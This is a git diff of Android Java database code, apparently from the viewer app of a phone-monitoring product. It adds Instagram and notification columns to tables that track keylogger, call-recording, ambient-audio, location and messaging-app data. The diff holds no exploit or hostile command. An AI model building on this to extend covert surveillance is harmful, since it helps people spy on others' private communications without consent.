@@ -33,12 +33,14 @@ import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_DEVICE;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_FACEBOOK;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_HANGOUTS;
+import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_INSTAGRAM;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_KEYLOGGER;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_KIK;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_LINE;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_LOCATION;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_NETWORK;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_NOTES;
+import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_NOTIFICATION;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_PHONE_CALL_RECORDING;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_PHOTO;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_SKYPE;
@@ -73,24 +75,26 @@ public class DatabaseLastUpdate
                     COLUMN_LAST_CONTACT + " TEXT," +
                     COLUMN_LAST_PHOTO + " TEXT," +
                     COLUMN_LAST_APPLICATION + " TEXT," +
-                COLUMN_LAST_PHONE_CALL_RECORDING + " TEXT," +
+                    COLUMN_LAST_PHONE_CALL_RECORDING + " TEXT," +
                     COLUMN_LAST_WHATSAPP + " TEXT," +
                     COLUMN_LAST_VIBER + " TEXT," +
                     COLUMN_LAST_FACEBOOK + " TEXT," +
                     COLUMN_LAST_SKYPE + " TEXT," +
-                COLUMN_LAST_NOTES + " TEXT," +
+                    COLUMN_LAST_NOTES + " TEXT," +
                     COLUMN_LAST_VIDEO + " TEXT," +
                     COLUMN_LAST_VOICE + " TEXT," +
                     COLUMN_LAST_AMBIENT_VOICE_RECORDING + " TEXT," +
                     COLUMN_LAST_KEYLOGGER + " TEXT," +
                     COLUMN_LAST_HANGOUTS + " TEXT," +
-                COLUMN_LAST_BBM + " TEXT," +
+                    COLUMN_LAST_BBM + " TEXT," +
                     COLUMN_LAST_LINE + " TEXT," +
+                    COLUMN_LAST_INSTAGRAM + " TEXT," +
                     COLUMN_LAST_KIK + " TEXT," +
                     COLUMN_LAST_APP_INSTALLATION + " TEXT," +
                     COLUMN_LAST_CLIPBOARD + " TEXT," +
                     COLUMN_LAST_CALENDAR + " TEXT," +
                     COLUMN_LAST_YOUTUBE + " TEXT," +
+                    COLUMN_LAST_NOTIFICATION + " TEXT," +
                     COLUMN_LAST_NETWORK + " TEXT" + ")";
 
         String scriptTable_LastPushUpdate = "CREATE TABLE " + TABLE_LAST_PUSH_UPDATE + "("
@@ -116,10 +120,12 @@ public class DatabaseLastUpdate
                 COLUMN_LAST_BBM + " TEXT," +
                 COLUMN_LAST_LINE + " TEXT," +
                 COLUMN_LAST_KIK + " TEXT," +
+                COLUMN_LAST_INSTAGRAM + " TEXT," +
                 COLUMN_LAST_APP_INSTALLATION + " TEXT," +
                 COLUMN_LAST_CLIPBOARD + " TEXT," +
                 COLUMN_LAST_CALENDAR + " TEXT," +
                 COLUMN_LAST_YOUTUBE + " TEXT," +
+                COLUMN_LAST_NOTIFICATION + " TEXT," +
                 COLUMN_LAST_NETWORK + " TEXT" + ")";
 
         if(!database.checkTableExist(TABLE_LAST_UPDATE))
